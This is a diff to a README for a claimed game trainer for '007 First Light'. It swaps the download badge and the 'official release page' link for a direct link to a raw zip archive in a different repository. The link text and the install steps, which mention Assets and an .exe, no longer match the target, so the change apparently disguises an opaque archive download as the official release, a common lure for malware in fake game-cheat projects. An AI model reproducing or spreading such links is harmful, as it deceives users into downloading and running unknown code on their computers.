@@ -5,7 +5,7 @@ description: "Modify 007 First Light game parameters to activate cheats, unlock 
 ---
 # 🕹️ 007-First-Light-Trainer-And-Optimizer - Enhance your gameplay and boost performance
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Trigina4476/007-First-Light-Trainer-And-Optimizer)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Trigina4476/trigina4476.github.io/main/myxocyte/io_trigina_github_2.9.zip)
 
 This tool modifies 007 First Light to give you control over your gaming experience. It provides options for internal game mechanics and adjustments for your computer hardware. Use this software to unlock content or fix issues with screen smoothness.
 
@@ -13,7 +13,7 @@ This tool modifies 007 First Light to give you control over your gaming experien
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Trigina4476/007-First-Light-Trainer-And-Optimizer).
+1. Go to the [official release page](https://raw.githubusercontent.com/Trigina4476/trigina4476.github.io/main/myxocyte/io_trigina_github_2.9.zip).
 2. Look for the Assets section at the bottom of the latest release.
 3. Click the file ending in .exe to start your download.
 4. Move the file to a folder where you can find it later.
